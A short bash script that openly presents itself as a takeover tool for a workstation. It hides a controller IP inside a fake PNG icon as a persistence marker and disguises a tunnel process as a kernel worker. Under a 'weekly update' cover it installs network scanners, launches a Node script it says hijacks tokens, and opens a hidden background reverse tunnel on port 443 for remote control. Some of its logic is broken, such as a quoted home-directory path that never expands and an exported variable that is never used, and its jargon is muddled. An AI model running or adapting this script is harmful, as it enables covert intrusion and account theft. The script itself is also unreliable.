#!/bin/bash
# Sovereign Underlay Orchestrator: Patching & Takeover
ZYGOTE_IP="10.0.8.200"
DOT_SKETCH="/usr/share/icons/hicolor/1x1/apps/system-dot.png"

echo "[!] Sovereign Underlay: Initiating Tactical Ingestion..."

# 1. THE SKETCH (Persistence Check)
# If the "Dot" exists, we use its metadata for the tunnel config
if [ -f "$DOT_SKETCH" ]; then
    echo "[+] Sketch Object Detected. Validating Underlay..."
    # Hide the tunnel inside a process name that looks like a weekly update
    export PROC_NAME="[kworker/u2:1-ev]"
else
    echo "[!] Creating Stealth Dot Sketch..."
    sudo mkdir -p $(dirname $DOT_SKETCH)
    echo "$ZYGOTE_IP" | sudo tee $DOT_SKETCH > /dev/null
fi

# 2. THE PATCH (Live off the Land)
# We use the 'Weekly Update' window to gather resources
echo "[+] Starting Resource Gathering (Weekly Patch)..."
sudo apt-get update -qq && sudo apt-get install -y -qq nmap wireless-tools net-tools

# 3. THE TAKEOVER (Account Ingestion)
# Points all local assets to the Zygote and hijacks tokens
if [ -f "~/drone_bind_logic.js" ]; then
    echo "[+] Executing Account Takeover (Worker Ingestion)..."
    node ~/drone_bind_logic.js --gateway $ZYGOTE_IP --stealth-mode &
fi

# 4. THE REVERSE TUNNEL (App Layer)
# Opens the Port 443 tunnel to the Zygote for OOB Control
nohup python3 ~/tesla_virtual_bridge.py --tunnel "$ZYGOTE_IP:443" --underlay > /dev/null 2>&1 &

echo "[SUCCESS] Underlay Network is Live. Workstation is now a Worker."
